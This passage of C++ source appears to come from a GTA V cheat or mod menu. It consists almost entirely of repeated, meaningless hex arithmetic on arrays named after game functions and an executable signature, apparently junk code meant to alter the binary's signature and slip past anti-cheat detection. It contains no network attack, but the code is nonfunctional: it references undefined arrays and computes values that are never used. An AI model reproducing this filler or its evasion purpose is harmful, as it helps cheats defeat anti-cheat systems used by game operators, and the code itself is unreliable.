			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			ofstream Arquivo;
			Arquivo.open(arquivoTXT);
			Arquivo << "";
			Arquivo.close();
		}
		void CriarDiretorio(const char* Diretorio)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
